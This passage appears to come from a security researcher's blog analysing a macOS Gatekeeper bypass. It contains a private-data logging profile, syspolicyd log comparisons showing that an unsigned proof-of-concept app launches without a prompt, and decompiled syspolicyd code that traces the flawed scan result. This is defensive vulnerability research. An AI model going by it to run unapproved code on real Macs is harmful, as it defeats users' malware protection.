<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-XML" data-lang="XML"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple Computer//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#f92672">&lt;plist</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.0&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#f92672">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  <span style="color:#f92672">&lt;key&gt;</span>PayloadContent<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#f92672">&lt;array&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#f92672">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#f92672">&lt;key&gt;</span>PayloadDisplayName<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>      <span style="color:#f92672">&lt;string&gt;</span>Private Data Logging<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      <span style="color:#f92672">&lt;key&gt;</span>PayloadIdentifier<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      <span style="color:#f92672">&lt;string&gt;</span>com.apple.private-data.logging<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>      <span style="color:#f92672">&lt;key&gt;</span>PayloadType<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>      <span style="color:#f92672">&lt;string&gt;</span>com.apple.system.logging<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>      <span style="color:#f92672">&lt;key&gt;</span>PayloadUUID<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>      <span style="color:#f92672">&lt;string&gt;</span>686285D4-CCD8-4A12-B861-080E1754E835<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>      <span style="color:#f92672">&lt;key&gt;</span>PayloadVersion<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>      <span style="color:#f92672">&lt;integer&gt;</span>1<span style="color:#f92672">&lt;/integer&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>      <span style="color:#f92672">&lt;key&gt;</span>System<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>      <span style="color:#f92672">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>        <span style="color:#f92672">&lt;key&gt;</span>Enable-Private-Data<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>        <span style="color:#f92672">&lt;true/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>                <span style="color:#f92672">&lt;key&gt;</span>Privacy-Enable-Level<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>                <span style="color:#f92672">&lt;string&gt;</span>Sensitive<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>                <span style="color:#f92672">&lt;key&gt;</span>Default-Privacy-Setting<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>                <span style="color:#f92672">&lt;string&gt;</span>Sensitive<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>      <span style="color:#f92672">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    <span style="color:#f92672">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>  <span style="color:#f92672">&lt;/array&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>  <span style="color:#f92672">&lt;key&gt;</span>PayloadDisplayName<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>  <span style="color:#f92672">&lt;string&gt;</span>Private Data Logging<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>  <span style="color:#f92672">&lt;key&gt;</span>PayloadIdentifier<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>  <span style="color:#f92672">&lt;string&gt;</span>LoggingProfile<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>  <span style="color:#f92672">&lt;key&gt;</span>PayloadRemovalDisallowed<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>  <span style="color:#f92672">&lt;false/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>  <span style="color:#f92672">&lt;key&gt;</span>PayloadType<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>  <span style="color:#f92672">&lt;string&gt;</span>Configuration<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>  <span style="color:#f92672">&lt;key&gt;</span>PayloadUUID<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>  <span style="color:#f92672">&lt;string&gt;</span>D2943CD1-75E8-4024-8525-79DF78377418<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>  <span style="color:#f92672">&lt;key&gt;</span>PayloadVersion<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>  <span style="color:#f92672">&lt;integer&gt;</span>1<span style="color:#f92672">&lt;/integer&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span><span style="color:#f92672">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span><span style="color:#f92672">&lt;/plist&gt;</span></span></span></code></pre></div>
<img src="../images/blog/blog_0x64/profile.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">A &#34;private data logging&#34; profile</center>

<br>
<div class="note">
For more information on the process of enabling read access to private log data, see:
<br>
<br>
<center>
  <a href="https://www.cmdsec.com/unified-logs-enable-private-data/" class="inlineLink">Unified Logs: How to Enable Private Data</a>.
</center>
</div>
<p>If your idea of fun is reading lines and lines and lines of largely irrelevant log messages, I&rsquo;m sorry (for several reasons). Here, I&rsquo;m only going to present a few relevant lines from executing first the &ldquo;normal&rdquo; mach-O application, then the &ldquo;normal&rdquo; script-based application, and finally our problematic proof of concept application. Again the goal is to identify both commonalities, and divergences in logging output amongst the three, with the hope of finding the general location of the bug. Recall also that all three applications are unsigned and downloaded from the Internet (and thus have been tagged with the file quarantine extended attribute).</p>
<p>First up, let&rsquo;s attempt to launch the &ldquo;normal&rdquo; mach-O application. I chose the <a href="https://sourceforge.net/projects/machoview/">MachOView</a> utility, grabbed off SourceForge. As we&rsquo;ve set macOS&rsquo;s application policy to its highest setting (only applications from the App Store) when we run it, it is, as expected blocked:</p>
<img src="../images/blog/blog_0x64/machoView.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">The normal (mach-O) app: blocked</center>

<p>Note that if we lower the policy to allow applications from either the macOS App Store or from &ldquo;identified developers&rdquo; it is still blocked as it is not notarized:</p>
<img src="../images/blog/blog_0x64/machoView2.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">The normal (mach-O) app: still blocked</center>

<p>Either way, note that neither prompt provides a way to allow the application to run.</p>
<p>Now to the logs!</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% log stream --level debug
...

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK process assessment: /Volumes/MachOView 1/MachOView.app/Contents/MacOS/MachOView <-- (/sbin/launchd, /Volumes/MachOView 1/MachOView.app/Contents/MacOS/MachOView)

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK performScan: PST: (path: /Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: (null))

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] Checking legacy notarization
<b>syspolicyd</b>: (Security) [com.apple.securityd:notarization] checking with online notarization service for hash ...
<b>syspolicyd</b>: (Security) [com.apple.securityd:notarization] isNotarized = 0

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK scan complete: PST: (path: /Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: (null)), 7, 0

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] App gets first launch prompt because responsibility: /Volumes/MachOView 1/MachOView.app/Contents/MacOS/MachOView, /Volumes/MachOView 1/MachOView.app

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK evaluateScanResult: 0, PST: (path: /Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: MachOView), 1, 0, 1, 0, 7, 0
<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK eval - was allowed: 0, show prompt: 1

<b>syspolicyd</b>:  (LaunchServices) [com.apple.launchservices:code-evaluation] present prompt: uid=501, conn=yes, type=NotAppStore, op.ident=549A641B-A106-4106-AEE7-42468AB103D6, info.ident=050770F1-87C7-4DD6-962B-3F5280789E3A, info={path=/Volumes/MachOView 1/MachOView.app team=(null) uid=501 bundle=/Volumes/MachOView 1/MachOView.app}

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] Prompt shown (7, 0), waiting for response: PST: (path: /Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: MachOView)
</pre>
</div>
<p>Examining log messages that are generated as a result of attempting to launch the standard mach-O application reveal that Apple&rsquo;s system policy daemon, <code>syspolicyd</code> is ultimately responsible for determining if the application is to be allowed &hellip;or denied.</p>
<p>The messages from <code>syspolicyd</code> show a Gatekeeper (<code>GK</code>) scan is performed on the application, as well as a notarization check (which returns false). The scan results are shown in the following message: &ldquo;<code>GK evaluateScanResult: 0, PST: (path: /Volumes/MachOView 1/MachOView.app), (team: (null)), (id: (null)), (bundle_id: MachOView), 1, 0, 1, 0, 7, 0</code>&rdquo;.</p>
<p>&hellip;we&rsquo;ll decode the meaning of these numbers shortly via reverse engineering.</p>
<p>In the next line of log output, we see a <code>show prompt: 1</code> (true). No surprise then, that a prompt (alert) is shown to the user, describing why the application is to be blocked. Once the user interacts with the prompt, the following log messages are generated, which confirm that the system (as expected) then blocks the application:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% log stream --level debug
...

<b>syspolicyd</b> (LaunchServices) [com.apple.launchservices:code-evaluation] handle prompt response=Acknowledge, op.ident=549A641B-A106-4106-AEE7-42468AB103D6, info.ident=050770F1-87C7-4DD6-962B-3F5280789E3A, info={path=/Volumes/MachOView 1/MachOView.app team=(null) uid=501 bundle=/Volumes/MachOView 1/MachOView.app}

<b>syspolicyd</b> [com.apple.syspolicy.exec:default] Terminating process due to Gatekeeper rejection: 20588, /Volumes/MachOView 1/MachOView.app/Contents/MacOS/MachOView

</pre>
</div>
<p>Moving on, let&rsquo;s reset the logs, and execute the second application &hellip;the normal, albeit script-based app (<code>Script.app</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% log stream --level debug
...

<b>syspolicyd</b> [com.apple.syspolicy.exec:default] Script evaluation: /Users/patrick/Downloads/Script.app/Contents/MacOS/Script, /bin/sh

<b>syspolicyd</b> [com.apple.syspolicy.exec:default] GK process assessment: /Users/patrick/Downloads/Script.app/Contents/MacOS/Script <-- (/bin/sh, /bin/sh)

<b>syspolicyd</b> [com.apple.syspolicy.exec:default] GK performScan: PST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: (null))

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] Checking legacy notarization
<b>syspolicyd</b>: (Security) [com.apple.securityd:notarization] checking with online notarization service for hash ...
<b>syspolicyd</b>: (Security) [com.apple.securityd:notarization] isNotarized = 0

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK scan complete: PST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: (null)), 7, 0

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] App gets first launch prompt because responsibility: /bin/sh, /Users/patrick/Downloads/Script.app

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK evaluateScanResult: 0, PST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: Script), 1, 0, 1, 0, 7, 0

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK eval - was allowed: 0, show prompt: 1

<b>syspolicyd</b>: (LaunchServices) [com.apple.launchservices:code-evaluation] present prompt: uid=501, conn=yes, type=NotAppStore, op.ident=21E84192-6289-4C1D-812B-F4027634D2B6, info.ident=563BA5D4-0EC1-4A06-AC40-7565352A71BD, info={path=/Users/patrick/Downloads/Script.app team=(null) uid=501 bundle=/Users/patrick/Downloads/Script.app}

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] Prompt shown (7, 0), waiting for response: PST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: Script)

</pre>
</div>
<p>First note one difference &hellip;the &ldquo;<code>Script evaluation:</code>&rdquo; log message, that indicates that there is a (slightly?) different code path for applications whose executable component is a script.</p>
<p>Other than that, the log messages are nearly identical to the the &ldquo;normal&rdquo; (machO-based) application: a Gatekeeper scan is performed that results in the same evaluation results: &ldquo;<code>GK evaluateScanResult: 0, PST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id: Script), 1, 0, 1, 0, 7, 0</code>&rdquo;.</p>
<p>Such an evaluation triggers other log messages, and of course a prompt that is shown to the user:</p>
<img src="../images/blog/blog_0x64/script.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">The normal (script-based) app: blocked</center>

<p>Once the user clicks OK, <code>syspolicyd</code> logs message related to blocking and terminating the application (e.g. &ldquo;<code>Terminating process due to Gatekeeper...</code>&rdquo;).</p>
<p>Now on to running our proof-of-concept application (<code>PoC.app</code>), which recall is allowed to run with <em>no</em> alerts nor prompts. Here are the relevant log messages from <code>syspolicyd</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% log stream --level debug
...

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] Script evaluation: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, /bin/sh

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK process assessment: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC <-- (/bin/sh, /bin/sh)

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK performScan: PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: (null))

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] Checking legacy notarization
<b>syspolicyd</b>: (Security) [com.apple.securityd:notarization] checking with online notarization service for hash ...
<b>syspolicyd</b>: (Security) [com.apple.securityd:notarization] isNotarized = 0

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK scan complete: PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: (null)), 7, 0

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] GK evaluateScanResult: 2, PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: NOT_A_BUNDLE), 1, 0, 1, 0, 7, 0

<b>syspolicyd</b>: [com.apple.syspolicy.exec:default] Updating flags: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, 512

</pre>
</div>
<p>The log messages start out identical to both the normal and script-based applications. However, note that the evaluation results come back different: &ldquo;<code>GK evaluateScanResult: 2, PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)), (bundle_id: NOT_A_BUNDLE), 1, 0, 1, 0, 7, 0</code>&rdquo; (Recall the other two applications returned with a &ldquo;<code>GK evaluateScanResult: 0</code>&rdquo;).</p>
<p>Following a evaluation result of 2 (versus a 0), no prompt-related log messages are shown &hellip;<code>syspolicyd</code> just logs &ldquo;<code>Updating flags: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, 512</code>&rdquo; and goes on its merry way (allowing our PoC application to run uninhibited)!</p>
<p>Hooray! &hellip;via log analysis we&rsquo;ve identified <code>syspolicyd</code> as the OS-component that is both core to the application analysis and approval process and likely contains the flaw. Moreover, we&rsquo;ve pinpointed divergent logic (that appears to skip any alerts and allows the application to run), based on a Gatekeeper scan result of a 2. #progress</p>
<p>Let&rsquo;s now dive into a full reverse-engineering session combining static and dynamic analysis of <code>syspolicyd</code> in order to uncover exactly why our problematic proof of concept application is triggering such a Gatekeeper scan result (a 2), and why this results in the alert/blocking logic being totally skipped!</p>
<h3 id="root-cause-analysis-to-the-disassembler--debugger">Root Cause Analysis: To The Disassembler &amp; Debugger!</h3>
<p>Analysis of log messages revealed that <code>syspolicyd</code> (as its name suggests) is the arbiter in determining if an application should be allowed to run. Moreover divergent log messages indicated that our proof of concept was perhaps triggering a logic flaw deep within <code>syspolicyd</code> &hellip;a flaw that would allow an unsigned, unnotarized application to be run, when it clearly should be resoundingly blocked!</p>
<p>Found in <code>/usr/libexec</code>, <code>syspolicyd</code> is fairly compact binary, though its role is imperative to system security (for example, it is also involved in authorizing KEXTs). Luckily due to its rather copious logging, we can quickly track down the code responsible for application assessments, which ultimately leads us to the bug.</p>
<p>Recall that when any script-based application is run (either the &ldquo;normal&rdquo; one that was blocked, or our funky PoC that was allowed), a log message is generated indicating perhaps some (script-specific) code path . For example, for our <code>PoC.app</code>, <code>syspolicyd</code> logs: <code>Script evaluation: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, /bin/sh</code>. This message appears to contain the full path of the item to evaluate (the script within our app), as well as the parent or responsible process (that is to say, who is about to run it). We find the code responsible for generating this log message within a unnamed subroutine in <code>syspolicyd</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">if</span> (os_log_type_enabled(rax, <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    var_50 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8400202</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>var_50 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>) <span style="color:#f92672">=</span> r13;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int16_t</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>var_50 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xc</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x840</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>var_50 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe</span>) <span style="color:#f92672">=</span> r12;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    os_log_impl(__mh_execute_header, rbx, <span style="color:#ae81ff">0x1</span>, <span style="color:#e6db74">&#34;Script evaluation: %@, %@&#34;</span>, <span style="color:#f92672">&amp;</span>var_50, <span style="color:#ae81ff">0x16</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>}</span></span></code></pre></div>
<p>Let&rsquo;s take a more comprehensive look at this subroutine, to understand its arguments, its logic, and how the (script-based) assessment will continue. Below, is an abridged, cleaned-up, an annotated decompilation of this subroutine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sub_10002a068</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">int</span> arg2, <span style="color:#66d9ef">int</span> arg3, 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>                   <span style="color:#66d9ef">int</span> arg4, <span style="color:#66d9ef">int</span> arg5, <span style="color:#66d9ef">int</span> arg6, <span style="color:#66d9ef">int</span> arg7) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>{
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>  <span style="color:#75715e">//init process path from arg4
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#75715e"></span>  path <span style="color:#f92672">=</span> [NSString stringWithUTF8String:arg4];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  <span style="color:#75715e">//init responsible process path from arg6
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span><span style="color:#75715e"></span>  rpPath <span style="color:#f92672">=</span> [NSString stringWithUTF8String:arg6];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  <span style="color:#75715e">//init parent process path from arg5
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#75715e"></span>  pPath <span style="color:#f92672">=</span> [NSString stringWithUTF8String:arg5];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>  <span style="color:#75715e">//grab a &#39;globalManager&#39;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span><span style="color:#75715e"></span>  execManger <span style="color:#f92672">=</span> [ExecManagerService globalManager];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>  <span style="color:#75715e">//log dbg msg
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (os_log_type_enabled(rax, <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
